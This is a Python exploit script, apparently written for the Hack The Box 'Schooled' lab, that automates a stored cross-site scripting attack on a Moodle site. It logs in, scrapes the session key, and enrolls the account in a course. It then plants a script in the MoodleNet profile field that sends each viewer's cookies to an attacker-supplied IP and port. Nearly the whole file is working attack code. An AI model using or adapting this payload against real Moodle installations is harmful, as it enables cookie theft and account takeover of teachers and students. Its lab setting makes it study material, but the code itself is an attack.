#!/usr/bin/python3
# Creator: brutuspt

import urllib.parse
import requests
import argparse
import os, sys
import base64
from bs4 import BeautifulSoup


parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)
parser.add_argument("-U", "--username", help="Username", required=True)
parser.add_argument("-P", "--password", help="Password", required=True)
#parser.add_argument("-wp", "--webport", help="Attacker Web Server Port (Where to server the payloads)", required=True)


args = parser.parse_args()

s = requests.Session()
"""
def register (target, username, password):
    # Registers the user in the Moodle platform
    
    url = "http://%s/moodle/login/signup.php" % target
    
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    data = { 
        "sesskey": "LgTBsIGFGU",
        "_qf__login_signup_form": 1,
        "mform_isexpanded_id_createuserandpass": 1,
        "mform_isexpanded_id_supplyinfo": 1, 
        "username" : username,
        "password" : password, 
        "email" : str(username)+"@student.schooled.htb",
        "email2" : str(username)+"@student.schooled.htb", 
        "firstname": "brutuspt",
        "lastname": "brutuspt",
        "city": "Lisboa",
        "contry": "PT",
        "submitbutton" : "Create my new account" 
        }
        
    proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.post(url, headers=headers, data=data, proxies=proxies)
    
    if "Please click on the link below to confirm your new account." in r.text:
        print("[INFO] " + str(username) + " was successfully registered in Moodle!")
    else:
        print("[ERROR] Registration Failed!")
        sys.exit(1)
    

    soup = BeautifulSoup(r.text, 'html.parser')

    for data in soup.find_all('input'):
        if str(username) in data:
            token = data.get("value")
            print(token)
"""

def login(target, username, password):
    #login function
    
    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    url = "http://%s/moodle/login/index.php" % target
    
    print("[INFO] Trying to grab the logintoken first...")
    r = s.get(url, proxies=proxies)

    soup = BeautifulSoup(r.text, 'html.parser')

    login_token = soup.find("input", {"name":"logintoken","type": "hidden"}).get("value")
    print("[SUCCESS] Grabbed!! Login Token: " + str(login_token))
    
    print("[INFO] Using the login token to login into Mooddle...")
    data = { "logintoken" : str(login_token), "username": username, "password" : password }
    
    r = s.post(url, data=data, headers=headers) # proxies=proxies
    if "Dashboard" in r.text:
        print("[INFO] Login using the " + str(username) + " user was successful!")
    else:
        print("[ERROR] Login Failed!")
        sys.exit(1)
    
    print("[INFO] Trying to grab the sesskey...")

    # grabbing the sesskey...pain in the ass
    soup = BeautifulSoup(r.text, 'html.parser')
    sesskey = str(soup("script")[1]).split("sesskey")[1][3:13]
    print("[SUCCESS] sesskey extracted successfully: " + str(sesskey))
    return sesskey


def enroll_maffs(target, sesskey):
    # This function will be responsible for signing my user into the Mathematics class
    
    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Origin": "http://"+ str(target),
        "Referer": "http://"+ str(target) + "/moodle/enrol/index.php?id=5",
        "Connection": "close",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
        "Sec-GPC": "1",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5"

     }
    url = "http://%s/moodle/enrol/index.php" % target

    print("[INFO] Requesting access to the Maffs class...")

    data = { "id" : "5", "instance": "12", "sesskey": sesskey, "_qf__12_enrol_self_enrol_form" : "1", "mform_isexpanded_id_selfheader" : "1", "submitbutton" : "Enrol me"}
    
    r = s.post(url, data=data, headers=headers, allow_redirects=True) # proxies=proxies
    #print(r.text)
    
    if "You are enrolled in the course." in r.text:
        print("[SUCCESS] The user was successfully enrolled into the Maffs class")
    else:
        print("[ERROR] It was not possible to enroll the user!")
  


def exploit_xss(target, username, sesskey, ip, port):
    # Create the XSS payload
    # POST the payload
    # Wait for the target to trigger it
    # Retrieve the cookie

    payload = "<script>var img = document.createElement('img');img.src = 'http://" + str(ip) + ":" + str(port) + "/cookie=' + document.cookie;</script>"

    #proxies = { "http" : "127.0.0.1:8080" }
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Origin": "http://"+ str(target),
        "Referer": "http://moodle.schooled.htb/moodle/user/edit.php?id=28&returnto=profile",
        "Connection": "close",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "DNT": "1",
        "Sec-GPC": "1",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.5"

     }

    
    url = "http://%s/moodle/user/edit.php" % target

    print("[INFO] Editing the user profile, more specifically, the moodlenetprofile parameter")

    data = "course=1&id=28&returnto=profile&id=28&course=1&mform_isexpanded_id_moodle_picture=1&sesskey=" + sesskey + "&_qf__user_edit_form=1&mform_isexpanded_id_moodle=1&mform_isexpanded_id_moodle_additional_names=0&mform_isexpanded_id_moodle_interests=0&mform_isexpanded_id_moodle_optional=0&firstname=brutuspt&lastname=lal&email=brutuspt%40student.schooled.htb&maildisplay=2&moodlenetprofile=" + urllib.parse.quote(payload) + "&city=&country=PT&timezone=99&description_editor%5Btext%5D=&description_editor%5Bformat%5D=1&description_editor%5Bitemid%5D=253209954&imagefile=777744395&imagealt=&firstnamephonetic=&lastnamephonetic=&middlename=&alternatename=&interests=_qf__force_multiselect_submission&url=&icq=&skype=&aim=&yahoo=&msn=&idnumber=&institution=&department=&phone1=&phone2=&address=&submitbutton=Update+profile"
    
    print(payload)
    
    r = s.post(url, data=data, headers=headers, allow_redirects=True) # proxies=proxies
    #print(r.text)
    
    if "MoodleNet profile" in r.text:
        print("[SUCCESS] We have successfully dropped our XSS payload into the moodlenetprofile area!")
    else:
        print("[ERROR] Something went wrong, we did not manage to drop our XSS payload!")
  


"""
def create_server():
    # HTTP Server receiving our stolen cookies    
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer((args.IP, int(args.webport)), handler)
    print("Serving our PHP payload here: http://%s:%s" % (args.IP, args.webport))
    httpd.serve_forever()

threading.Thread(target=create_server).start()
"""

def main():
    if args.target == "moodle.schooled.htb":
        #register(args.target, args.username, args.password)
        sesskey = login(args.target, args.username, args.password)
        enroll_maffs(args.target, sesskey)
        exploit_xss(args.target, args.username, sesskey, args.IP, args.port)

    else:
        print("[ERROR] Please use the subdomain moodle.schooled.htb as the target")
        sys.exit(0)


if __name__ == "__main__":
    main()
